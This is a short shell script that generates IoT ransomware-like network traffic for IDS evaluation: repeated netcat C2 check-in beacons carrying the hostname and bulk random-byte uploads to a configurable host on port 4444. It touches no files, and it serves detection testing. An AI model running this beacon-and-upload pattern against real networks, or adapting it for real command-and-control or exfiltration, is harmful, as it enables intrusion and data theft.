#!/bin/sh
# IoT Ransomware simulation — reproduces the NETWORK signature of ransomware on a
# home device (C2 check-in + bulk encrypted-looking data exfil) for IDS evaluation.
# This is traffic-pattern only: it does NOT encrypt, read, or touch any files.
echo "[IOT-RANSOMWARE] Starting..."
TARGET="${TARGET_HOST:-172.20.0.10}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
C2_PORT="${C2_PORT:-4444}"
END=$(($(date +%s) + DURATION))

# Intensity -> exfil chunk size (bytes) / beacons per burst / pause
case "$INTENSITY" in
    low)    CHUNK=65536;   BURST=2; SLEEP_MAX=6 ;;
    high)   CHUNK=1048576; BURST=8; SLEEP_MAX=2 ;;
    *)      CHUNK=262144;  BURST=4; SLEEP_MAX=4 ;;  # medium
esac

while [ $(date +%s) -lt $END ]; do
    # C2 check-in beacon
    i=0
    while [ $i -lt $BURST ]; do
        printf 'RANSOM-CHECKIN host=%s id=%s\n' "$(hostname)" "$RANDOM" \
            | nc -w 2 "$TARGET" "$C2_PORT" 2>/dev/null
        # Bulk high-entropy "encrypted" upload (random bytes, no real files touched)
        head -c "$CHUNK" /dev/urandom \
            | nc -w 5 "$TARGET" "$C2_PORT" 2>/dev/null
        i=$((i + 1))
    done
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[IOT-RANSOMWARE] Done."
